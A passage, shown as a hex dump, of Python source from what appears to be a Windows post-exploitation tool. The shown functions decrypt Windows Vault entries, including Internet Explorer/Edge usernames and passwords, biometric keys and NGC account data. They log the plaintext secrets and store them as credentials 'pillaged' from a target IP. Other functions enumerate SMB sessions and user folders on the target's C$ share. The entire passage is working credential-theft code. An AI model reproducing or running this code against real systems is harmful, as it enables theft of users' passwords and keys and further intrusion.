-0000fa70: 0a09 0909 0909 0964 6174 6120 3d20 7365  .......data = se
-0000fa80: 6c66 2e64 756d 705f 5641 554c 545f 4e47  lf.dump_VAULT_NG
-0000fa90: 435f 4143 434f 4f55 4e54 2875 7365 722c  C_ACCOOUNT(user,
-0000faa0: 206c 6f63 616c 6669 6c65 2c20 6461 7461   localfile, data
-0000fab0: 290a 0909 0909 0909 7365 6c66 2e6c 6f67  ).......self.log
-0000fac0: 7365 6372 6574 2866 2256 6175 6c74 207b  secret(f"Vault {
-0000fad0: 7661 756c 745f 6e61 6d65 7d20 3a20 7b64  vault_name} : {d
-0000fae0: 6174 617d 2022 290a 0909 0909 0965 6c69  ata} ")......eli
-0000faf0: 6620 7661 756c 745f 7479 7065 203d 3d20  f vault_type == 
-0000fb00: 2749 6e74 6572 6e65 7420 4578 706c 6f72  'Internet Explor
-0000fb10: 6572 273a 0a09 0909 0909 0964 6174 6120  er':.......data 
-0000fb20: 3d20 7365 6c66 2e64 756d 705f 5641 554c  = self.dump_VAUL
-0000fb30: 545f 494e 5445 524e 4554 5f45 5850 4c4f  T_INTERNET_EXPLO
-0000fb40: 5245 5228 7573 6572 2c20 6c6f 6361 6c66  RER(user, localf
-0000fb50: 696c 652c 2064 6174 6129 0a0a 0909 0909  ile, data)......
-0000fb60: 0923 2075 7365 722e 7365 6372 6574 735b  .# user.secrets[
-0000fb70: 2256 6175 6c74 3a25 7322 2025 2076 6175  "Vault:%s" % vau
-0000fb80: 6c74 5f6e 616d 655d 203d 2064 6174 610a  lt_name] = data.
-0000fb90: 0909 0909 0973 6563 7265 745f 6669 6c65  .....secret_file
-0000fba0: 5b27 7365 6372 6574 275d 203d 2064 6174  ['secret'] = dat
-0000fbb0: 610a 0909 0909 0973 656c 662e 6475 6d70  a......self.dump
-0000fbc0: 5f74 6f5f 6669 6c65 286c 6f63 616c 6669  _to_file(localfi
-0000fbd0: 6c65 2c20 6461 7461 290a 0909 0909 6578  le, data).....ex
-0000fbe0: 6365 7074 2045 7863 6570 7469 6f6e 2061  cept Exception a
-0000fbf0: 7320 6578 3a0a 0909 0909 0973 656c 662e  s ex:......self.
-0000fc00: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-0000fc10: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-0000fc20: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-0000fc30: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
-0000fc40: 4e47 7d45 7863 6570 7420 3120 7072 6f63  NG}Except 1 proc
-0000fc50: 6573 735f 6465 6372 7970 7465 645f 6461  ess_decrypted_da
-0000fc60: 7461 2056 6175 6c74 2066 6f72 207b 6c6f  ta Vault for {lo
-0000fc70: 6361 6c66 696c 657d 207b 6263 6f6c 6f72  calfile} {bcolor
-0000fc80: 732e 454e 4443 7d22 290a 0909 0909 0973  s.ENDC}")......s
-0000fc90: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000fca0: 6728 6578 290a 0909 6578 6365 7074 2045  g(ex)...except E
-0000fcb0: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
-0000fcc0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-0000fcd0: 6465 6275 6728 0a09 0909 0966 225b 7b73  debug(.....f"[{s
-0000fce0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-0000fcf0: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
-0000fd00: 2e57 4152 4e49 4e47 7d45 7863 6570 7420  .WARNING}Except 
-0000fd10: 3220 7072 6f63 6573 735f 6465 6372 7970  2 process_decryp
-0000fd20: 7465 645f 6461 7461 2041 4c4c 2066 6f72  ted_data ALL for
-0000fd30: 207b 6c6f 6361 6c66 696c 657d 207b 6263   {localfile} {bc
-0000fd40: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-0000fd50: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000fd60: 6275 6728 6578 290a 0a09 6465 6620 6475  bug(ex)...def du
-0000fd70: 6d70 5f56 4155 4c54 5f49 4e54 4552 4e45  mp_VAULT_INTERNE
-0000fd80: 545f 4558 504c 4f52 4552 2873 656c 662c  T_EXPLORER(self,
-0000fd90: 2075 7365 722c 206c 6f63 616c 6669 6c65   user, localfile
-0000fda0: 2c20 7661 756c 745f 626c 6f62 293a 0a09  , vault_blob):..
-0000fdb0: 0974 7279 3a0a 0909 0973 656c 662e 6c6f  .try:....self.lo
-0000fdc0: 6767 696e 672e 6465 6275 6728 2246 6f72  gging.debug("For
-0000fdd0: 6d61 7469 6e67 2056 4155 4c54 5f49 4e54  mating VAULT_INT
-0000fde0: 4552 4e45 545f 4558 504c 4f52 4552 2069  ERNET_EXPLORER i
-0000fdf0: 6e66 6f22 290a 0909 0972 6574 7661 6c20  nfo")....retval 
-0000fe00: 3d20 225b 496e 7465 726e 6574 2045 7870  = "[Internet Exp
-0000fe10: 6c6f 7265 725d 5c6e 220a 0909 0972 6574  lorer]\n"....ret
-0000fe20: 7661 6c20 2b3d 2066 2255 7365 726e 616d  val += f"Usernam
-0000fe30: 6520 2020 2020 2020 203a 207b 7661 756c  e        : {vaul
-0000fe40: 745f 626c 6f62 5b27 5573 6572 6e61 6d65  t_blob['Username
-0000fe50: 275d 2e64 6563 6f64 6528 2775 7466 2d31  '].decode('utf-1
-0000fe60: 366c 6527 297d 205c 6e22 0a09 0909 7265  6le')} \n"....re
-0000fe70: 7476 616c 202b 3d20 6622 5265 736f 7572  tval += f"Resour
-0000fe80: 6365 2020 2020 2020 2020 3a20 7b76 6175  ce        : {vau
-0000fe90: 6c74 5f62 6c6f 625b 2752 6573 6f75 7263  lt_blob['Resourc
-0000fea0: 6527 5d2e 6465 636f 6465 2827 7574 662d  e'].decode('utf-
-0000feb0: 3136 6c65 2729 7d20 5c6e 220a 0909 0972  16le')} \n"....r
-0000fec0: 6574 7661 6c20 2b3d 2066 2250 6173 7377  etval += f"Passw
-0000fed0: 6f72 6420 2020 2020 2020 203a 207b 7661  ord        : {va
-0000fee0: 756c 745f 626c 6f62 5b27 5061 7373 776f  ult_blob['Passwo
-0000fef0: 7264 275d 2e64 6563 6f64 6528 2775 7466  rd'].decode('utf
-0000ff00: 2d31 366c 6527 297d 203a 207b 6865 786c  -16le')} : {hexl
-0000ff10: 6966 7928 7661 756c 745f 626c 6f62 5b27  ify(vault_blob['
-0000ff20: 5061 7373 776f 7264 275d 297d 205c 6e22  Password'])} \n"
-0000ff30: 0a09 0909 2323 2323 2323 2323 2323 2323  ....############
-0000ff40: 5052 4f43 4553 5349 4e47 2044 4154 410a  PROCESSING DATA.
-0000ff50: 0909 0973 656c 662e 6462 2e61 6464 5f63  ...self.db.add_c
-0000ff60: 7265 647a 2863 7265 647a 5f74 7970 653d  redz(credz_type=
-0000ff70: 2762 726f 7773 6572 2d69 6e74 6572 6e65  'browser-interne
-0000ff80: 745f 6578 706c 6f72 6572 272c 0a09 0909  t_explorer',....
-0000ff90: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
-0000ffa0: 6e61 6d65 3d66 227b 7661 756c 745f 626c  name=f"{vault_bl
-0000ffb0: 6f62 5b27 5573 6572 6e61 6d65 275d 2e64  ob['Username'].d
-0000ffc0: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
-0000ffd0: 297d 222c 0a09 0909 0909 0909 2020 6372  )}",........  cr
-0000ffe0: 6564 7a5f 7061 7373 776f 7264 3d66 227b  edz_password=f"{
-0000fff0: 7661 756c 745f 626c 6f62 5b27 5061 7373  vault_blob['Pass
-00010000: 776f 7264 275d 2e64 6563 6f64 6528 2775  word'].decode('u
-00010010: 7466 2d31 366c 6527 297d 222c 0a09 0909  tf-16le')}",....
-00010020: 0909 0909 2020 6372 6564 7a5f 7461 7267  ....  credz_targ
-00010030: 6574 3d66 227b 7661 756c 745f 626c 6f62  et=f"{vault_blob
-00010040: 5b27 5265 736f 7572 6365 275d 2e64 6563  ['Resource'].dec
-00010050: 6f64 6528 2775 7466 2d31 366c 6527 297d  ode('utf-16le')}
-00010060: 222c 0a09 0909 0909 0909 2020 6372 6564  ",........  cred
-00010070: 7a5f 7061 7468 3d6c 6f63 616c 6669 6c65  z_path=localfile
-00010080: 2c0a 0909 0909 0909 0920 2070 696c 6c61  ,........  pilla
-00010090: 6765 645f 6672 6f6d 5f63 6f6d 7075 7465  ged_from_compute
-000100a0: 725f 6970 3d73 656c 662e 6f70 7469 6f6e  r_ip=self.option
-000100b0: 732e 7461 7267 6574 5f69 702c 0a09 0909  s.target_ip,....
-000100c0: 0909 0909 2020 7069 6c6c 6167 6564 5f66  ....  pillaged_f
-000100d0: 726f 6d5f 7573 6572 6e61 6d65 3d75 7365  rom_username=use
-000100e0: 722e 7573 6572 6e61 6d65 290a 0909 0973  r.username)....s
-000100f0: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
-00010100: 280a 0909 0909 6622 5b7b 7365 6c66 2e6f  (.....f"[{self.o
-00010110: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00010120: 7d5d 205b 2b5d 207b 6263 6f6c 6f72 732e  }] [+] {bcolors.
-00010130: 4f4b 4752 4545 4e7d 205b 4945 2f45 4447  OKGREEN} [IE/EDG
-00010140: 4520 5061 7373 776f 7264 5d20 7b62 636f  E Password] {bco
-00010150: 6c6f 7273 2e45 4e44 437d 2066 6f72 207b  lors.ENDC} for {
-00010160: 7661 756c 745f 626c 6f62 5b27 5265 736f  vault_blob['Reso
-00010170: 7572 6365 275d 2e64 6563 6f64 6528 2775  urce'].decode('u
-00010180: 7466 2d31 366c 6527 297d 205b 207b 6263  tf-16le')} [ {bc
-00010190: 6f6c 6f72 732e 4f4b 424c 5545 7d7b 7661  olors.OKBLUE}{va
-000101a0: 756c 745f 626c 6f62 5b27 5573 6572 6e61  ult_blob['Userna
-000101b0: 6d65 275d 2e64 6563 6f64 6528 2775 7466  me'].decode('utf
-000101c0: 2d31 366c 6527 297d 203a 207b 7661 756c  -16le')} : {vaul
-000101d0: 745f 626c 6f62 5b27 5061 7373 776f 7264  t_blob['Password
-000101e0: 275d 2e64 6563 6f64 6528 2775 7466 2d31  '].decode('utf-1
-000101f0: 366c 6527 297d 7b62 636f 6c6f 7273 2e45  6le')}{bcolors.E
-00010200: 4e44 437d 205d 2229 0a09 0909 7265 7475  NDC} ]")....retu
-00010210: 726e 2072 6574 7661 6c0a 0909 6578 6365  rn retval...exce
-00010220: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
-00010230: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
-00010240: 696e 672e 6465 6275 6728 0a09 0909 0966  ing.debug(.....f
-00010250: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-00010260: 7461 7267 6574 5f69 707d 5d20 7b62 636f  target_ip}] {bco
-00010270: 6c6f 7273 2e57 4152 4e49 4e47 7d45 7863  lors.WARNING}Exc
-00010280: 6570 7469 6f6e 2064 756d 705f 5641 554c  eption dump_VAUL
-00010290: 545f 494e 5445 524e 4554 5f45 5850 4c4f  T_INTERNET_EXPLO
-000102a0: 5245 527b 6263 6f6c 6f72 732e 454e 4443  RER{bcolors.ENDC
-000102b0: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
-000102c0: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
-000102d0: 6465 6620 6475 6d70 5f56 4155 4c54 5f57  def dump_VAULT_W
-000102e0: 494e 5f42 494f 5f4b 4559 2873 656c 662c  IN_BIO_KEY(self,
-000102f0: 2075 7365 722c 206c 6f63 616c 6669 6c65   user, localfile
-00010300: 2c20 7661 756c 745f 626c 6f62 293a 0a09  , vault_blob):..
-00010310: 0974 7279 3a0a 0909 0973 656c 662e 6c6f  .try:....self.lo
-00010320: 6767 696e 672e 6465 6275 6728 2244 756d  gging.debug("Dum
-00010330: 7069 6e67 2056 4155 4c54 5f57 494e 5f42  ping VAULT_WIN_B
-00010340: 494f 5f4b 4559 2069 6e66 6f20 746f 2066  IO_KEY info to f
-00010350: 696c 6522 290a 0909 0972 6574 7661 6c20  ile")....retval 
-00010360: 3d20 225c 6e5b 5749 4e44 4f57 5320 4249  = "\n[WINDOWS BI
-00010370: 4f4d 4554 5249 4320 4b45 595d 5c6e 220a  OMETRIC KEY]\n".
-00010380: 0909 0972 6574 7661 6c20 2b3d 2027 5369  ...retval += 'Si
-00010390: 6420 2020 2020 2020 2020 203a 2025 735c  d          : %s\
-000103a0: 6e27 2025 2052 5043 5f53 4944 2862 275c  n' % RPC_SID(b'\
-000103b0: 7830 355c 7830 305c 7830 305c 7830 3027  x05\x00\x00\x00'
-000103c0: 202b 2076 6175 6c74 5f62 6c6f 625b 2753   + vault_blob['S
-000103d0: 6964 275d 292e 666f 726d 6174 4361 6e6f  id']).formatCano
-000103e0: 6e69 6361 6c28 290a 0909 0972 6574 7661  nical()....retva
-000103f0: 6c20 2b3d 2066 2246 7269 656e 646c 7920  l += f"Friendly 
-00010400: 4e61 6d65 3a20 7b76 6175 6c74 5f62 6c6f  Name: {vault_blo
-00010410: 625b 274e 616d 6527 5d2e 6465 636f 6465  b['Name'].decode
-00010420: 2827 7574 662d 3136 6c65 2729 7d5c 6e22  ('utf-16le')}\n"
-00010430: 0a09 0909 7265 7476 616c 202b 3d20 6622  ....retval += f"
-00010440: 4269 6f6d 6574 7269 6320 4b65 793a 2030  Biometric Key: 0
-00010450: 787b 6865 786c 6966 7928 7661 756c 745f  x{hexlify(vault_
-00010460: 626c 6f62 5b27 4269 6f4b 6579 275d 5b27  blob['BioKey']['
-00010470: 624b 6579 275d 292e 6465 636f 6465 2827  bKey']).decode('
-00010480: 6c61 7469 6e2d 3127 297d 5c6e 220a 0909  latin-1')}\n"...
-00010490: 0972 6574 7572 6e20 7265 7476 616c 0a09  .return retval..
-000104a0: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
-000104b0: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
-000104c0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
-000104d0: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-000104e0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-000104f0: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
-00010500: 477d 4578 6365 7074 696f 6e20 6475 6d70  G}Exception dump
-00010510: 5f56 4155 4c54 5f57 494e 5f42 494f 5f4b  _VAULT_WIN_BIO_K
-00010520: 4559 207b 6263 6f6c 6f72 732e 454e 4443  EY {bcolors.ENDC
-00010530: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
-00010540: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
-00010550: 6465 6620 6475 6d70 5f56 4155 4c54 5f4e  def dump_VAULT_N
-00010560: 4743 5f4c 4f43 414c 5f41 4343 4f4f 554e  GC_LOCAL_ACCOOUN
-00010570: 5428 7365 6c66 2c20 7573 6572 2c20 6c6f  T(self, user, lo
-00010580: 6361 6c66 696c 652c 2076 6175 6c74 5f62  calfile, vault_b
-00010590: 6c6f 6229 3a0a 0909 7472 793a 0a09 0909  lob):...try:....
-000105a0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-000105b0: 7567 2822 4475 6d70 696e 6720 4e47 435f  ug("Dumping NGC_
-000105c0: 4c4f 4341 4c5f 4143 434f 4f55 4e54 2069  LOCAL_ACCOOUNT i
-000105d0: 6e66 6f20 746f 2066 696c 6522 290a 0909  nfo to file")...
-000105e0: 0972 6574 7661 6c20 3d20 225c 6e5b 4e47  .retval = "\n[NG
-000105f0: 4320 4c4f 4341 4c20 4143 434f 4f55 4e54  C LOCAL ACCOOUNT
-00010600: 5d5c 6e22 0a09 0909 7265 7476 616c 202b  ]\n"....retval +
-00010610: 3d20 2755 6e6c 6f63 6b4b 6579 2020 2020  = 'UnlockKey    
-00010620: 3a20 2573 5c6e 2720 2520 6865 786c 6966  : %s\n' % hexlif
-00010630: 7928 7661 756c 745f 626c 6f62 5b22 556e  y(vault_blob["Un
-00010640: 6c6f 636b 4b65 7922 5d29 0a09 0909 7265  lockKey"])....re
-00010650: 7476 616c 202b 3d20 2749 5620 2020 2020  tval += 'IV     
-00010660: 2020 2020 2020 3a20 2573 5c6e 2720 2520        : %s\n' % 
-00010670: 6865 786c 6966 7928 7661 756c 745f 626c  hexlify(vault_bl
-00010680: 6f62 5b22 4956 225d 290a 0909 0972 6574  ob["IV"])....ret
-00010690: 7661 6c20 2b3d 2027 4369 7068 6572 5465  val += 'CipherTe
-000106a0: 7874 2020 203a 2025 735c 6e27 2025 2068  xt   : %s\n' % h
-000106b0: 6578 6c69 6679 2876 6175 6c74 5f62 6c6f  exlify(vault_blo
-000106c0: 625b 2243 6970 6865 7254 6578 7422 5d29  b["CipherText"])
-000106d0: 0a09 0909 7265 7475 726e 2072 6574 7661  ....return retva
-000106e0: 6c0a 0909 6578 6365 7074 2045 7863 6570  l...except Excep
-000106f0: 7469 6f6e 2061 7320 6578 3a0a 0909 0973  tion as ex:....s
-00010700: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00010710: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
-00010720: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00010730: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
-00010740: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
-00010750: 756d 705f 4e47 435f 4c4f 4341 4c5f 4143  ump_NGC_LOCAL_AC
-00010760: 434f 4f55 4e54 207b 6263 6f6c 6f72 732e  COOUNT {bcolors.
-00010770: 454e 4443 7d22 290a 0909 0973 656c 662e  ENDC}")....self.
-00010780: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
-00010790: 290a 0a09 6465 6620 6475 6d70 5f56 4155  )...def dump_VAU
-000107a0: 4c54 5f4e 4743 5f41 4343 4f4f 554e 5428  LT_NGC_ACCOOUNT(
-000107b0: 7365 6c66 2c20 7573 6572 2c20 6c6f 6361  self, user, loca
-000107c0: 6c66 696c 652c 2076 6175 6c74 5f62 6c6f  lfile, vault_blo
-000107d0: 6229 3a0a 0909 7472 793a 0a09 0909 7365  b):...try:....se
-000107e0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-000107f0: 2822 4475 6d70 696e 6720 5641 554c 545f  ("Dumping VAULT_
-00010800: 4e47 435f 4143 434f 4f55 4e54 2069 6e66  NGC_ACCOOUNT inf
-00010810: 6f20 746f 2066 696c 6522 290a 0909 0972  o to file")....r
-00010820: 6574 7661 6c20 3d20 225c 6e5b 4e47 4320  etval = "\n[NGC 
-00010830: 5641 554c 545d 5c6e 220a 0909 0972 6574  VAULT]\n"....ret
-00010840: 7661 6c20 2b3d 2027 5369 6420 2020 2020  val += 'Sid     
-00010850: 2020 2020 203a 2025 735c 6e27 2025 2052       : %s\n' % R
-00010860: 5043 5f53 4944 2862 275c 7830 355c 7830  PC_SID(b'\x05\x0
-00010870: 305c 7830 305c 7830 3027 202b 2076 6175  0\x00\x00' + vau
-00010880: 6c74 5f62 6c6f 625b 2753 6964 275d 292e  lt_blob['Sid']).
-00010890: 666f 726d 6174 4361 6e6f 6e69 6361 6c28  formatCanonical(
-000108a0: 290a 0909 0972 6574 7661 6c20 2b3d 2027  )....retval += '
-000108b0: 4672 6965 6e64 6c79 204e 616d 653a 2025  Friendly Name: %
-000108c0: 735c 6e27 2025 2076 6175 6c74 5f62 6c6f  s\n' % vault_blo
-000108d0: 625b 274e 616d 6527 5d2e 6465 636f 6465  b['Name'].decode
-000108e0: 2827 7574 662d 3136 6c65 2729 0a09 0909  ('utf-16le')....
-000108f0: 2320 4120 636f 6d70 6c65 7465 7220 3f0a  # A completer ?.
-00010900: 0909 0976 6175 6c74 5f62 6c6f 625b 2742  ...vault_blob['B
-00010910: 6c6f 6227 5d2e 6475 6d70 2829 0a0a 0909  lob'].dump()....
-00010920: 0972 6574 7572 6e20 7265 7476 616c 0a09  .return retval..
-00010930: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
-00010940: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
-00010950: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
-00010960: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-00010970: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00010980: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
-00010990: 477d 4578 6365 7074 696f 6e20 6475 6d70  G}Exception dump
-000109a0: 5f56 4155 4c54 5f4e 4743 5f41 4343 4f4f  _VAULT_NGC_ACCOO
-000109b0: 554e 547b 6263 6f6c 6f72 732e 454e 4443  UNT{bcolors.ENDC
-000109c0: 7d22 290a 0909 0973 656c 662e 6c6f 6767  }")....self.logg
-000109d0: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
-000109e0: 6465 6620 646f 5f77 686f 2873 656c 6629  def do_who(self)
-000109f0: 3a0a 0909 2320 6966 2073 656c 662e 6c6f  :...# if self.lo
-00010a00: 6767 6564 496e 2069 7320 4661 6c73 653a  ggedIn is False:
-00010a10: 0a09 0923 0973 656c 662e 6c6f 6767 696e  ...#.self.loggin
-00010a20: 672e 6572 726f 7228 224e 6f74 206c 6f67  g.error("Not log
-00010a30: 6765 6420 696e 2229 0a09 0923 0972 6574  ged in")...#.ret
-00010a40: 7572 6e0a 0909 7270 6374 7261 6e73 706f  urn...rpctranspo
-00010a50: 7274 203d 2074 7261 6e73 706f 7274 2e53  rt = transport.S
-00010a60: 4d42 5472 616e 7370 6f72 7428 7365 6c66  MBTransport(self
-00010a70: 2e73 6d62 2e67 6574 5265 6d6f 7465 486f  .smb.getRemoteHo
-00010a80: 7374 2829 2c20 6669 6c65 6e61 6d65 3d72  st(), filename=r
-00010a90: 275c 7372 7673 7663 272c 0a09 0909 0909  '\srvsvc',......
-00010aa0: 0909 0909 0909 2020 736d 625f 636f 6e6e  ......  smb_conn
-00010ab0: 6563 7469 6f6e 3d73 656c 662e 736d 6229  ection=self.smb)
-00010ac0: 0a09 0964 6365 203d 2072 7063 7472 616e  ...dce = rpctran
-00010ad0: 7370 6f72 742e 6765 745f 6463 655f 7270  sport.get_dce_rp
-00010ae0: 6328 290a 0909 6463 652e 636f 6e6e 6563  c()...dce.connec
-00010af0: 7428 290a 0909 6463 652e 6269 6e64 2873  t()...dce.bind(s
-00010b00: 7276 732e 4d53 5250 435f 5555 4944 5f53  rvs.MSRPC_UUID_S
-00010b10: 5256 5329 0a09 0972 6573 7020 3d20 7372  RVS)...resp = sr
-00010b20: 7673 2e68 4e65 7472 5365 7373 696f 6e45  vs.hNetrSessionE
-00010b30: 6e75 6d28 6463 652c 204e 554c 4c2c 204e  num(dce, NULL, N
-00010b40: 554c 4c2c 2031 3029 0a0a 0909 666f 7220  ULL, 10)....for 
-00010b50: 7365 7373 696f 6e20 696e 2072 6573 705b  session in resp[
-00010b60: 2749 6e66 6f53 7472 7563 7427 5d5b 2753  'InfoStruct']['S
-00010b70: 6573 7369 6f6e 496e 666f 275d 5b27 4c65  essionInfo']['Le
-00010b80: 7665 6c31 3027 5d5b 2742 7566 6665 7227  vel10']['Buffer'
-00010b90: 5d3a 0a09 0909 7365 6c66 2e6c 6f67 6769  ]:....self.loggi
-00010ba0: 6e67 2e69 6e66 6f28 2268 6f73 743a 2025  ng.info("host: %
-00010bb0: 3135 732c 2075 7365 723a 2025 3573 2c20  15s, user: %5s, 
-00010bc0: 6163 7469 7665 3a20 2535 642c 2069 646c  active: %5d, idl
-00010bd0: 653a 2025 3564 2220 2520 280a 0909 0909  e: %5d" % (.....
-00010be0: 7365 7373 696f 6e5b 2773 6573 6931 305f  session['sesi10_
-00010bf0: 636e 616d 6527 5d5b 3a2d 315d 2c20 7365  cname'][:-1], se
-00010c00: 7373 696f 6e5b 2773 6573 6931 305f 7573  ssion['sesi10_us
-00010c10: 6572 6e61 6d65 275d 5b3a 2d31 5d2c 2073  ername'][:-1], s
-00010c20: 6573 7369 6f6e 5b27 7365 7369 3130 5f74  ession['sesi10_t
-00010c30: 696d 6527 5d2c 0a09 0909 0973 6573 7369  ime'],.....sessi
-00010c40: 6f6e 5b27 7365 7369 3130 5f69 646c 655f  on['sesi10_idle_
-00010c50: 7469 6d65 275d 2929 0a09 0909 7365 6c66  time']))....self
-00010c60: 2e64 622e 6164 645f 636f 6e6e 6563 7465  .db.add_connecte
-00010c70: 645f 7573 6572 2875 7365 726e 616d 653d  d_user(username=
-00010c80: 7365 7373 696f 6e5b 2773 6573 6931 305f  session['sesi10_
-00010c90: 7573 6572 6e61 6d65 275d 5b3a 2d31 5d2c  username'][:-1],
-00010ca0: 2069 703d 7365 7373 696f 6e5b 2773 6573   ip=session['ses
-00010cb0: 6931 305f 636e 616d 6527 5d5b 3a2d 315d  i10_cname'][:-1]
-00010cc0: 290a 0a09 6465 6620 6765 745f 7573 6572  )...def get_user
-00010cd0: 7328 7365 6c66 293a 0a09 0973 656c 662e  s(self):...self.
-00010ce0: 6c6f 6767 696e 672e 6465 6275 6728 224c  logging.debug("L
-00010cf0: 6973 7469 6e67 2055 7365 7273 2062 7920  isting Users by 
-00010d00: 656e 756d 6572 6174 696e 6720 6469 7265  enumerating dire
-00010d10: 6374 6f72 6965 7320 696e 2024 5368 6172  ctories in $Shar
-00010d20: 655c 5c55 7365 7273 2229 0a09 0962 6c61  e\\Users")...bla
-00010d30: 636b 6c69 7374 203d 205b 272e 272c 2027  cklist = ['.', '
-00010d40: 2e2e 272c 2027 6465 736b 746f 702e 696e  ..', 'desktop.in
-00010d50: 6927 5d0a 0909 7368 6172 6573 203d 2073  i']...shares = s
-00010d60: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
-00010d70: 745f 7368 6172 6573 2829 0a09 0923 2049  t_shares()...# I
-00010d80: 6e74 c3a9 6772 6572 206c 6573 2075 7365  nt..grer les use
-00010d90: 7273 2073 6861 7265 2064 7520 7072 656d  rs share du prem
-00010da0: 6965 7220 7465 7374 0a09 0969 6620 2743  ier test...if 'C
-00010db0: 2427 2069 6e20 7368 6172 6573 3a20 2023  $' in shares:  #
-00010dc0: 204d 6f73 7420 6c69 6b65 6c79 0a09 0909   Most likely....
-00010dd0: 7365 6c66 2e6d 7966 696c 656f 7073 2e64  self.myfileops.d
-00010de0: 6f5f 7573 6528 2743 2427 290a 0909 0923  o_use('C$')....#
-00010df0: 2073 656c 662e 6d79 6669 6c65 6f70 732e   self.myfileops.
-00010e00: 7077 6420 3d20 2755 7365 7273 270a 0909  pwd = 'Users'...
-00010e10: 0963 6f6d 706c 6574 696f 6e20 3d20 7365  .completion = se
-00010e20: 6c66 2e6d 7966 696c 656f 7073 2e64 6f5f  lf.myfileops.do_
-00010e30: 6c73 2827 5573 6572 7327 2c20 272a 272c  ls('Users', '*',
-00010e40: 2064 6973 706c 6179 3d46 616c 7365 290a   display=False).
-00010e50: 0909 0966 6f72 2069 6e66 6f73 2069 6e20  ...for infos in 
-00010e60: 636f 6d70 6c65 7469 6f6e 3a0a 0909 0909  completion:.....
-00010e70: 6c6f 6e67 6e61 6d65 2c20 6973 5f64 6972  longname, is_dir
-00010e80: 6563 746f 7279 203d 2069 6e66 6f73 0a09  ectory = infos..
-00010e90: 0909 0969 6620 6973 5f64 6972 6563 746f  ...if is_directo
-00010ea0: 7279 2061 6e64 206c 6f6e 676e 616d 6520  ry and longname 
-00010eb0: 6e6f 7420 696e 2062 6c61 636b 6c69 7374  not in blacklist
-00010ec0: 3a0a 0909 0909 0966 6f72 2075 7365 7220  :......for user 
-00010ed0: 696e 2073 656c 662e 7573 6572 733a 0a09  in self.users:..
-00010ee0: 0909 0909 0969 6620 6c6f 6e67 6e61 6d65  .....if longname
-00010ef0: 203d 3d20 7573 6572 2e75 7365 726e 616d   == user.usernam
-00010f00: 653a 0a09 0909 0909 0909 6272 6561 6b0a  e:........break.
-00010f10: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-00010f20: 0973 656c 662e 7573 6572 732e 6170 7065  .self.users.appe
-00010f30: 6e64 284d 7955 7365 7228 6c6f 6e67 6e61  nd(MyUser(longna
-00010f40: 6d65 2c20 7365 6c66 2e6c 6f67 6769 6e67  me, self.logging
-00010f50: 2c20 7365 6c66 2e6f 7074 696f 6e73 2929  , self.options))
-00010f60: 0a09 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-00010f70: 696e 672e 696e 666f 280a 0909 0909 0909  ing.info(.......
-00010f80: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
-00010f90: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
-00010fa0: 5d20 466f 756e 6420 7573 6572 207b 6263  ] Found user {bc
-00010fb0: 6f6c 6f72 732e 4f4b 424c 5545 7d7b 6c6f  olors.OKBLUE}{lo
-00010fc0: 6e67 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ngname}{bcolors.
-00010fd0: 454e 4443 7d22 290a 0909 0909 0909 7573  ENDC}").......us
-00010fe0: 6572 203d 2073 656c 662e 4765 7455 7365  er = self.GetUse
